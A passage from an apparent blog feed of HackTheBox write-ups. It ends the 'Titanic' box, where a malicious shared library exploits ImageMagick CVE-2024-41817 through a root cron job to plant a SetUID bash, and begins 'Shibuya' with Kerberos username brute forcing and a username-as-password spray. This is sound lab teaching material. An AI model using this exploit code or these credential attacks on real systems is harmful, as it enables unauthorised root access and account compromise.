0.0 0.1 8680 5484 pts/0 Ss 19:53 0:00 -bash develop+ 73134 0.0 0.0 10072 1608 pts/0 R+ 19:57 0:00 ps auxww </span></code></pre></div></div> <p>This is because <code class="language-plaintext highlighter-rouge">/proc</code> is mounted with the <code class="language-plaintext highlighter-rouge">hidepid</code> option set to <code class="language-plaintext highlighter-rouge">invisible</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:~$</span><span class="w"> </span>mount | <span class="nb">grep</span> <span class="s2">"/proc "</span> <span class="go">proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible) </span></code></pre></div></div> <h4 id="filesystem">FileSystem</h4> <p>There are things in <code class="language-plaintext highlighter-rouge">/opt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/$</span><span class="w"> </span><span class="nb">ls</span> /opt/ <span class="go">app containerd scripts </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">app</code> contains the same stuff already analyzed in Gitea.</p> <p>developer doesn’t have read access into <code class="language-plaintext highlighter-rouge">containerd</code>.</p> <p><code class="language-plaintext highlighter-rouge">scripts</code> contains a single <code class="language-plaintext highlighter-rouge">.sh</code> script:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/scripts$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">identify_images.sh </span></code></pre></div></div> <p>It’s only three lines:</p> <div class="language-bash wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt/app/static/assets/images <span class="nb">truncate</span> <span class="nt">-s</span> 0 metadata.log find /opt/app/static/assets/images/ <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.jpg"</span> | xargs /usr/bin/magick identify <span class="o">&gt;&gt;</span> metadata.log </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">metadata.log</code> has information on each image in <code class="language-plaintext highlighter-rouge">images</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">ls</span> <span class="go">entertainment.jpg exquisite-dining.jpg favicon.ico home.jpg luxury-cabins.jpg metadata.log </span><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">cat </span>metadata.log <span class="go">/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.004 /opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000 /opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000 /opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000 </span></code></pre></div></div> <p>It also is owned by root and seems to be being written to every minute:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> metadata.log <span class="go">-rw-r----- 1 root developer 442 Feb 19 20:04 metadata.log </span><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">date</span> <span class="go">Wed Feb 19 08:04:14 PM UTC 2025 </span><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">sleep </span>45<span class="p">;</span> <span class="nb">ls</span> <span class="nt">-l</span> metadata.log <span class="go">-rw-r----- 1 root developer 442 Feb 19 20:05 metadata.log </span></code></pre></div></div> <p>This implies that the script is being run on a cron.</p> <h3 id="cve-2024-41817">CVE-2024-41817</h3> <h4 id="identify">Identify</h4> <p>developer has write access to the <code class="language-plaintext highlighter-rouge">images</code> folder, so it’s worth looking at what I might exploit here. The obvious target in that script is <a href="https://imagemagick.org/index.php">Image Magick</a>. The version on Titanic is 7.1.1-35:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span>magick <span class="nt">-version</span> <span class="go">Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (9.4) </span></code></pre></div></div> <p>Searching for CVEs, the top result in a <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">security advisory on the ImageMagick GitHub</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219150626388.webp" /> <img loading="lazy" src="/img/image-20250219150626388.png" alt="image-20250219150626388" class="include_image " /> </picture> <h4 id="vulnerability-details">Vulnerability Details</h4> <p>The issue is with how some versions of ImageMagick are compiled in such a way that the current working directory being included in the search path for configuration files and shared libraries.</p> <p>There are two ways to exploit this shown in the POCs section of the advisory. The first involves a <code class="language-plaintext highlighter-rouge">delegates.xml</code> file. I wasn’t able to get this to work, and it seems to need to be included in the call to <code class="language-plaintext highlighter-rouge">magick</code>.</p> <p>The other POC involves writing a shared library to the same directory named <code class="language-plaintext highlighter-rouge">libxcb.so.1</code>. This is a shared library used low level interactions with the X11 Windowing system. What’s important here is that it’s loaded by Image Magick, and since the current directory is in the path checked for that, it will try to load it here.</p> <h4 id="poc-1">POC</h4> <p>The POC in the advisory is to run this command to build the shared library:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-x</span> c <span class="nt">-shared</span> <span class="nt">-fPIC</span> <span class="nt">-o</span> ./libxcb.so.1 - <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; __attribute__((constructor)) void init(){ system("id"); exit(0); } </span><span class="no">EOF </span></code></pre></div></div> <p>And then see that running <code class="language-plaintext highlighter-rouge">magick</code> runs <code class="language-plaintext highlighter-rouge">id</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span><span class="nb">ls</span> <span class="nt">-al</span> <span class="go">total 24 drwxr-xr-x 2 user user 4096 Jul 20 11:53 . drwxrwxrwt 1 user user 4096 Jul 20 11:53 .. -rwxr-xr-x 1 user user 16240 Jul 20 11:53 libxcb.so.1 </span><span class="gp">$ </span><span class="nb">id</span> <span class="go">uid=1000(user) gid=1000(user) groups=1000(user) </span><span class="gp">$ </span>magick /dev/null /dev/null <span class="go">uid=1000(user) gid=1000(user) groups=1000(user) </span></code></pre></div></div> <p>I can do that same thing on Titanic:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span>gcc <span class="nt">-x</span> c <span class="nt">-shared</span> <span class="nt">-fPIC</span> <span class="nt">-o</span> ./libxcb.so.1 - <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> </span><span class="c">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; </span><span class="go"> __attribute__((constructor)) void init(){ system("id"); exit(0); } EOF </span><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span>magick /dev/null /dev/null <span class="go">uid=1000(developer) gid=1000(developer) groups=1000(developer) </span></code></pre></div></div> <p>When <code class="language-plaintext highlighter-rouge">magick</code> runs, it loads the library which calls <code class="language-plaintext highlighter-rouge">system("id")</code> in it’s constructor.</p> <h4 id="shell-1">Shell</h4> <p>To get a shell, I’ll make a SetUID / SetGID copy of <code class="language-plaintext highlighter-rouge">bash</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span>gcc <span class="nt">-x</span> c <span class="nt">-shared</span> <span class="nt">-fPIC</span> <span class="nt">-o</span> ./libxcb.so.1 - <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> </span><span class="c">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; </span><span class="go"> __attribute__((constructor)) void init(){ system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"); exit(0); } EOF </span></code></pre></div></div> <p>This time I have to wait for the cron to run, as developer doesn’t have the privileges to run it. After the next minute rolls, my <code class="language-plaintext highlighter-rouge">bash</code> is there:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf <span class="go">-rwsrwsrwx 1 root root 1396520 Feb 19 20:20 /tmp/0xdf </span></code></pre></div></div> <p>Running it with <code class="language-plaintext highlighter-rouge">-p</code> gives a root shell and the flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:/opt/app/static/assets/images$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span> <span class="gp">0xdf-5.1#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt <span class="go">aa13708b************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-titanic"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="htb-titanic"/>
<category term="hackthebox"/>
<category term="ctf"/>
<category term="nmap"/>
<category term="ubuntu"/>
<category term="ffuf"/>
<category term="subdomain"/>
<category term="flask"/>
<category term="feroxbuster"/>
<category term="gitea"/>
<category term="source-code"/>
<category term="docker"/>
<category term="burp"/>
<category term="burp-repeater"/>
<category term="directory-traversal"/>
<category term="file-read"/>
<category term="gitea-hash"/>
<category term="htb-compiled"/>
<category term="hashcat"/>
<category term="image-magick"/>
<category term="cve-2024-41817"/>
<category term="shared-object"/>
<summary type="html">
<![CDATA[ Titanic offers a website and a Gitea instance with the source code. I’ll look at the source to identify a directory traversal / file read vulnerability. I’ll use that to read the Gitea DB and crack a hash from the users table. That password works over SSH as well. I’ll find a cron running as root that is running Image Magick on images in a given directory. I’ll exploit a CVE in Image Magick to get execution as root. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/titanic-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/titanic-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Shibuya</title>
<link href="https://0xdf.gitlab.io/2025/06/19/htb-shibuya.html" rel="alternate" type="text/html" title="HTB: Shibuya"/>
<published>2025-06-19T09:00:00+00:00</published>
<updated>2025-06-19T09:00:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/19/htb-shibuya</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/19/htb-shibuya.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/shibuya-cover.webp" /> <img loading="lazy" src="/img/shibuya-cover.png" alt="Shibuya" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Shibuya starts with a brute force user enumeration over Kerberos, finding two machine accounts with their passwords set to their username. I’ll use those to enumerate LDAP, finding credentials for a service account in a comment. That user has access to an SMB share with three Windows Imaging images, and one contains backups of the registry hives. I’ll dump hashes from these, and spray them to get access to another user and a shell. There’s another user logged into the box, and I’ll use RemotePotato0 to get a shell with a cross session relay attack. This user can exploit ESC1 in the ADCS configuration to get administrator access.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/667 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/shibuya" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Shibuya</a> <a href="https://hackthebox.com/machines/shibuya" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-shibuya.webp" /> <img src="/icons/box-shibuya.png" alt="Shibuya" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/shibuya" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1935714229530607839">19 Jun 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">19 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Windows <picture><source type="image/webp" srcset="/icons/Windows.webp" /><img src="/icons/Windows.png" alt="Windows" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" target="_blank" rel="noopener"><img alt="xct" src="https://www.hackthebox.com/badge/image/13569" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> xct</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds 18 open TCP ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.129.234.42 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 21:46 UTC Nmap scan report for 10.129.234.42 Host is up (0.092s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 9389/tcp open adws 49664/tcp open unknown 49669/tcp open unknown 51041/tcp open unknown 51050/tcp open unknown 51061/tcp open unknown 51071/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-vv</span> <span class="nt">-p</span> 22,53,88,135,139,445,464,593,3268,3269,3389,9389 <span class="nt">-sCV</span> 10.129.234.42 <span class="go">...[snip]... Nmap scan report for 10.129.234.42 Host is up, received echo-reply ttl 127 (0.091s latency). Scanned at 2025-05-11 21:47:43 UTC for 190s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0) 53/tcp open domain? syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-11 22:02:32Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:AWSJPDC0522.shibuya.vl | Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha512WithRSAEncryption | Not valid before: 2025-02-15T07:26:20 | Not valid after: 2026-02-15T07:26:20 | MD5: 8b7d:cbab:0d10:bf99:f94f:4ea1:0872:618b | SHA-1: 945d:150a:de26:1ee1:42f7:7cfa:5f9d:1205:e5a4:138d | -----BEGIN CERTIFICATE----- | MIIHUjCCBTqgAwIBAgITIwAAAAIbTKknK3CMGwAAAAAAAjANBgkqhkiG9w0BAQ0F ...[snip]... | KgwRRAR/g8UMiN2+k3yROGgy0vFhmTwkhF43wDsH8PrYWdTs8bzp0FRezCn5wOWf | gUfBEYm3 |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:AWSJPDC0522.shibuya.vl | Issuer: commonName=shibuya-AWSJPDC0522-CA/domainComponent=shibuya | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha512WithRSAEncryption | Not valid before: 2025-02-15T07:26:20 | Not valid after: 2026-02-15T07:26:20 | MD5: 8b7d:cbab:0d10:bf99:f94f:4ea1:0872:618b | SHA-1: 945d:150a:de26:1ee1:42f7:7cfa:5f9d:1205:e5a4:138d | -----BEGIN CERTIFICATE----- | MIIHUjCCBTqgAwIBAgITIwAAAAIbTKknK3CMGwAAAAAAAjANBgkqhkiG9w0BAQ0F ...[snip]... | gUfBEYm3 |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time 3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: SHIBUYA | NetBIOS_Domain_Name: SHIBUYA | NetBIOS_Computer_Name: AWSJPDC0522 | DNS_Domain_Name: shibuya.vl | DNS_Computer_Name: AWSJPDC0522.shibuya.vl | DNS_Tree_Name: shibuya.vl | Product_Version: 10.0.20348 |_ System_Time: 2025-05-11T22:04:52+00:00 |_ssl-date: 2025-05-11T22:05:32+00:00; +14m41s from scanner time. | ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl | Issuer: commonName=AWSJPDC0522.shibuya.vl | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-02-18T08:24:25 | Not valid after: 2025-08-20T08:24:25 | MD5: 4246:05f7:afb9:7eb3:2348:d2f0:9fc2:79b3 | SHA-1: 26ad:cec9:1e96:7061:a186:9867:92cb:7bcf:220e:40e6 | -----BEGIN CERTIFICATE----- | MIIC8DCCAdigAwIBAgIQHupD92/tYrRIVm9eKsHZyTANBgkqhkiG9w0BAQsFADAh ...[snip]... | vP4hxdG9n8cZDtncd5mY/oYPtvNS/3gVUg8bt3hJ/l+ehxZP |_-----END CERTIFICATE----- 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-05-11T22:04:57 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 65218/tcp): CLEAN (Timeout) | Check 2 (port 54325/tcp): CLEAN (Timeout) | Check 3 (port 22528/udp): CLEAN (Timeout) | Check 4 (port 11487/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: mean: 14m40s, deviation: 0s, median: 14m40s ...[snip]... Nmap done: 1 IP address (1 host up) scanned in 189.70 seconds </span></code></pre></div></div> <p>Many of these (53, 88, 464, 593, 3268, 3269) look like <a href="/cheatsheets/os#windows-domain-controller">Windows domain controller ports</a>. Others (135,139, 445) are <a href="/cheatsheets/os#windows-client">common Windows ports</a>. 3389 is remote desktop. SSH on 22 is interesting, and not super common, but not unheard of for Windows.</p> <p>I’ll note that 389 (LDAP) and 636 (LDAPS) are not open, which will be limiting.</p> <p>The domain <code class="language-plaintext highlighter-rouge">shibuya.vl</code> is present on the LDAPS certificates and over RDP, as well the name <code class="language-plaintext highlighter-rouge">AWSJPDC0522.shibuya.vl</code>.</p> <h3 id="smb---tcp-445">SMB - TCP 445</h3> <p><code class="language-plaintext highlighter-rouge">netexec</code> shows the same host / domain information:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.42 <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span></code></pre></div></div> <p>I’m not able to list shares without a valid account:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.42 <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> shibuya.vl\guest: STATUS_ACCOUNT_DISABLED </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.42 <span class="nt">-u</span> 0xdf <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\0xdf: STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>I’ll have <code class="language-plaintext highlighter-rouge">netexec</code> generate a hosts line for me:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.42 <span class="nt">--generate-hosts-file</span> hosts <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts <span class="go">10.129.234.42 AWSJPDC0522.shibuya.vl shibuya.vl AWSJPDC0522 </span></code></pre></div></div> <p>I’ll add that to the top of my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p> <h2 id="auth-as-red">Auth as red</h2> <h3 id="kerberos-brute-force-usernames">Kerberos Brute Force Usernames</h3> <p>With access to Kerberos, I can start by brute forcing usernames using <code class="language-plaintext highlighter-rouge">kerbrute</code> and the <code class="language-plaintext highlighter-rouge">userenum</code> mode. I’ll give it a large list, and it finds two users within a couple seconds:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>kerbrute userenum <span class="nt">-d</span> shibuya.vl <span class="nt">--dc</span> 10.129.234.42 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt <span class="go"> __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 05/12/25 - Ronnie Flathers @ropnop 2025/05/12 00:49:43 &gt; Using KDC(s): 2025/05/12 00:49:43 &gt; 10.129.234.42:88 2025/05/12 00:49:44 &gt; [+] VALID USERNAME: purple@shibuya.vl 2025/05/12 00:49:46 &gt; [+] VALID USERNAME: red@shibuya.vl ...[snip]... </span></code></pre></div></div> <p>If I let this run for many hours, it will find a bunch more:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2025/05/12 02:58:41 &gt; [+] VALID USERNAME: william.thomas@shibuya.vl 2025/05/12 04:50:59 &gt; [+] VALID USERNAME: stuart.taylor@shibuya.vl 2025/05/12 05:00:12 &gt; [+] VALID USERNAME: stacey.jones@shibuya.vl 2025/05/12 06:14:17 &gt; [+] VALID USERNAME: sally.brown@shibuya.vl 2025/05/12 09:41:09 &gt; [+] VALID USERNAME: melissa.jones@shibuya.vl 2025/05/12 09:41:29 &gt; [+] VALID USERNAME: melanie.grant@shibuya.vl 2025/05/12 11:40:40 &gt; [+] VALID USERNAME: kevin.green@shibuya.vl 2025/05/12 11:41:28 &gt; [+] VALID USERNAME: kerry.hall@shibuya.vl 2025/05/12 11:42:36 &gt; [+] VALID USERNAME: kenneth.shaw@shibuya.vl 2025/05/12 11:43:43 &gt; [+] VALID USERNAME: kelly.davies@shibuya.vl 2025/05/12 11:52:34 &gt; [+] VALID USERNAME: karl.brown@shibuya.vl 2025/05/12 14:16:43 &gt; [+] VALID USERNAME: gary.wood@shibuya.vl 2025/05/12 15:14:12 &gt; [+] VALID USERNAME: emma.noble@shibuya.vl 2025/05/12 15:33:19 &gt; [+] VALID USERNAME: dylan.brown@shibuya.vl 2025/05/12 16:23:58 &gt; [+] VALID USERNAME: david.poole@shibuya.vl </span></code></pre></div></div> <p>I don’t need to find these with brute force because once I have valid creds, I can dump all the users.</p> <h3 id="username-as-password">Username as Password</h3> <p>A common check would be for users with their password as their username. Trying this with NTLM login doesn’t show anything:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="nb">users</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\red:red STATUS_LOGON_FAILURE </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.42 445 AWSJPDC0522 </span><span class="netexec-logfail">[-]</span><span class="go"> shibuya.vl\purple:purple STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>red and purple are actually machine accounts, which means it won’t work with NTLM. Using Kerberos, they both work:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> <span class="nb">users</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span> <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\red:red </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logsuccess">[+]</span><span class="go"> shibuya.vl\purple:purple </span></code></pre></div></div> <h2 id="auth-as-svc_autojoin">Auth as svc_autojoin</h2> <h3 id="authenticated-smb">Authenticated SMB</h3> <h4 id="shares">Shares</h4> <p>red has access to some shares:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb shibuya.vl <span class="nt">-u</span> red <span class="nt">-p</span> red <span class="nt">-k</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> shibuya.vl 445 AWSJPDC0522 </span><span 